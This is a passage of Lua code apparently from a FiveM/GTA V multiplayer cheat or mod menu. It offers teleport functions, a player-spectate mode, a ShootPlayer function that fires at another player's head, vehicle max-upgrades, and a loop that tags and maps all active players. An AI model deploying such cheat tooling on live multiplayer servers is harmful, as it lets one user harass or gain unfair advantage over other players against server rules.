	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL"
}

local Enabled = true
local Collision = true

function TeleportToCoords()
    local x = KeyboardInput("Enter X Pos", "", 100)
    local y = KeyboardInput("Enter Y Pos", "", 100)
    local z = KeyboardInput("Enter Z Pos", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        drawNotification("~g~Invalid Coords!")
    end
end

local function LSPD()
    local bB = 436.873
    local bC = -987.138
    local bD = 30.69
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function fbi()
    local bB = 160.868
    local bC = -745.831
    local bD = 250.063
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function ls()
    local bB = -365.425
    local bC = -131.809
    local bD = 37.873
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function gp()
    local bB = 266.12
    local bC = -752.51
    local bD = 34.64
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function dealership()
    local bB = -15.32
    local bC = -1080.69
    local bD = 26.14
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function Ammunation()
    local bB = 19.22
    local bC = -1108.71
    local bD = 29.8
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function shopclothes()
    local bB = 428.61
    local bC = -799.89
    local bD = 29.49
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function barber()
    local bB = -32.84
    local bC = -152.34
    local bD = 57.08
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function MichaelHouse()
    local bB = -801.847
    local bC = 175.266
    local bD = 72.845
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function trevor()
    local bB = 1972.972
    local bC = 3816.498
    local bD = 32.95
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function spot()
    local bB = 497.76
    local bC = -1334.01
    local bD = 29.33
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function MazeBank()
    local bB = -75.015
    local bC = -818.215
    local bD = 326.176
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function TeleportToWaypoint()
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local blipIterator = GetBlipInfoIdIterator(8)
		local blip = GetFirstBlipInfoId(8, blipIterator)
		WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
		wp = true
	else
		drawNotification("~r~No waypoint!")
	end

	local zHeigt = 0.0
	height = 1000.0
	while true do
		Citizen.Wait(0)
		if wp then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end

			SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
			FreezeEntityPosition(entity, true)
			local Pos = GetEntityCoords(entity, true)

			if zHeigt == 0.0 then
				height = height - 25.0
				SetEntityCoords(entity, Pos.x, Pos.y, height)
				bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
			else
				SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
				FreezeEntityPosition(entity, false)
				wp = false
				height = 1000.0
				zHeigt = 0.0
				drawNotification("~h~-» ~g~Teleported to waypoint!")
				break
			end
		end
	end
end

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}
	i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

local Spectating = false

function SpectatePlayer(player)
	local playerPed = PlayerPedId()
	Spectating = not Spectating
	local targetPed = GetPlayerPed(player)

	if (Spectating) then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(true, targetPed)

		drawNotification("Spectating " .. GetPlayerName(player))
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(false, targetPed)

		drawNotification("Stopped Spectating " .. GetPlayerName(player))
	end
end


function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end
function engine(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)				
end

function engine1(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function DelVeh(veh)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end


entityEnumerator = {
	__gc = function(enum)
	  if enum.destructor and enum.handle then
		enum.destructor(enum.handle)
	  end
	  enum.destructor = nil
	  enum.handle = nil
	end
  }

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  local iter, id = initFunc()
	  if not id or id == 0 then
		disposeFunc(iter)
		return
	  end
	  
	  local enum = {handle = iter, destructor = disposeFunc}
	  setmetatable(enum, entityEnumerator)
	  
	  local next = true
	  repeat
		coroutine.yield(id)
		next, id = moveFunc(iter)
	  until not next
	  
	  enum.destructor, enum.handle = nil, nil
	  disposeFunc(iter)
	end)
  end

  function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
  end

  function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
  end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

  function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
  end

function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification("Hung for 5 seconds, killing to prevent issues...")
		end
	end
end

function getEntity(player)
	local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
	return entity
end

function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end


local playerBlips = true

ShowHudComponentThisFrame(14)

Citizen.CreateThread(function() 
	local headId = {}
	while true do
		Citizen.Wait(1)
		if playerBlips then
		
			for id = 0, 128 do
				if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)

				
					
					headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
					wantedLvl = GetPlayerWantedLevel(id)

					
					if wantedLvl then
						SetMpGamerTagVisibility(headId[id], 7, true)
						SetMpGamerTagWantedLevel(headId[id], wantedLvl)
					else
						SetMpGamerTagVisibility(headId[id], 7, false)
					end

				
					if NetworkIsPlayerTalking(id) then
						SetMpGamerTagVisibility(headId[id], 9, true) 
					else
						SetMpGamerTagVisibility(headId[id], 9, false)
					end

					

					if not DoesBlipExist(blip) then 
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						ShowHeadingIndicatorOnBlip(blip, true)
					else
						veh = GetVehiclePedIsIn(ped, false)
						blipSprite = GetBlipSprite(blip)
						if not GetEntityHealth(ped) then
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								ShowHeadingIndicatorOnBlip(blip, false)
							end
						elseif veh then
							vehClass = GetVehicleClass(veh)
							vehModel = GetEntityModel(veh)
							if vehClass == 15 then
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehClass == 8 then
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehClass == 16 then
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										ShowHeadingIndicatorOnBlip(blip, false) 
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehClass == 14 then
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then 
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("limo2") then
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("rhino") then
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("pbus") then 
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("taxi") then 
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
